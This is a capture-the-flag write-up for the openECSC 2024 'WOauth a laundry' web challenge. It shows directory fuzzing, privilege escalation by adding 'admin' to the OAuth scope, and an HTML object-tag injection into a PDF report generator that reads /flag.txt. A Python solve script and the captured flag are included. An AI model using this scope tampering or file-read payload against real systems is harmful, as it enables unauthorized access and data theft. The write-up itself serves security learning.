# WOauth a laundry!

## Description
```
Welcome to our innovative business, the only ONE Laundry capable of completely sanitize your clothing by removing 100% of bacteria and viruses.

Flag is in /flag.txt.

Site: http://woauthalaundry.challs.open.ecsc2024.it
```

## Writeup

Starting off, I took a look at the website itself which didn't reveal a lot. <br/>
Finding nothing, I started a directory scan onto the website. <br/>
```sh
$ ffuf -w ./Tools/wordlists/wordlists/discovery/common.txt -u http://woauthalaundry.challs.open.ecsc2024.it/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://woauthalaundry.challs.open.ecsc2024.it/FUZZ
 :: Wordlist         : FUZZ: /home/aryt3/Tools/wordlists/wordlists/discovery/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

admin                   [Status: 200, Size: 4615, Words: 254, Lines: 39, Duration: 2291ms]
api                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 833ms]
:: Progress: [4613/4613] :: Job [1/1] :: 53 req/sec :: Duration: [0:01:35] :: Errors: 0 ::
```

Using `burpsuite`, I than continued to login to the platform. <br/>
Accessing the `/admin` webpage I tried to `generate a report` which only returned a `401` status code which means unauthorized. <br/>
Knowing that I didn't have sufficient permissions I took a closer look at the login function. <br/>

Intercepting the login request in burpsuite reveals a lot of parameters. <br/>
```sh
GET /openid/authentication?response_type=token%20id_token&client_id=ELX4Gr0HSRZx&scope=openid%20laundry%20amenities&redirect_uri=http://localhost:5173/&grant_type=implicit&nonce=nonce HTTP/1.1
Host: woauthalaundry.challs.open.ecsc2024.it
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Accept: */*
Referer: http://woauthalaundry.challs.open.ecsc2024.it/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close
```

Intercepting the request I was trying to tamper with the scope. <br/>
After adding `%20admin` to the scope, I discovered that I was granted authorization to access the `/admin` endpoint. <br/>

Accessing the `/admin` webpage I obtained these endpoint specifications. <br/>
```json
{
    "admin_endpoints": [
        {
            "exampleBody": { "requiredBy":"John Doe" },
            "methods": ["POST"],
            "path": "/generate_report"
        }
    ]
}
```

Seeing these specifications and the available endpoint I sent a request to generate a report via burpsuite. <br/>
```sh
POST /api/v1/generate-report HTTP/1.1
Host: woauthalaundry.challs.open.ecsc2024.it
Content-Length: 28
Authorization: Bearer d8a953f5e7924c46a0bb98807a45512b
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://woauthalaundry.challs.open.ecsc2024.it
Referer: http://woauthalaundry.challs.open.ecsc2024.it/admin
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

{
 "requiredBy":"John Doe"
}
```

The generated report did include `Report required by: John Doe`. <br/>
Knowing that I was able to inject something into the PDF I now only had to find a way to link the content of `/flag.txt` into the `.pdf` file. <br/>
Doing this with `javascript` is fairly easy as I just need to create an `object` and pass `flag.txt` as object-content. <br/>
```
POST /api/v1/generate-report HTTP/1.1
Host: woauthalaundry.challs.open.ecsc2024.it
Content-Length: 28
Authorization: Bearer d8a953f5e7924c46a0bb98807a45512b
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://woauthalaundry.challs.open.ecsc2024.it
Referer: http://woauthalaundry.challs.open.ecsc2024.it/admin
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

{
 "requiredBy":"<object data='/flag.txt'></object>"
}
```

For higher efficiency I made a python script to automatically retrieve the flag. <br/>
```py
import re, requests, PyPDF2

base_URL = 'http://woauthalaundry.challs.open.ecsc2024.it/'

headers = {
    'Authorization': 'Bearer d8a953f5e7924c46a0bb98807a45512b',
}

payload = {
    'requiredBy': '<object data="/flag.txt"></object>'
}

response = requests.post(f'{base_URL}api/v1/generate-report', json=payload, headers=headers)


if response.status_code == 200:

    with open('out.pdf', 'wb') as file:
        file.write(response.content)

    with open('out.pdf', 'rb') as pdf_file:

        pdf_reader = PyPDF2.PdfFileReader(pdf_file)

        pdf_text = ''
        for page_num in range(pdf_reader.numPages):
            page = pdf_reader.getPage(page_num)
            pdf_text += page.extractText()

    pdf_text = pdf_text.replace('\n', '')

    openECSC_match = re.search(r'openECSC{([^}]*)}', pdf_text)

    if openECSC_match:
        openECSC_item = openECSC_match.group(0)
        print(openECSC_item)
```

Executing the python script reveals the flag. <br/>
```sh
$ python3 solve.py 
openECSC{On3_l4uNdrY_70_ruL3_7h3m_4l1!_d208a530}
```

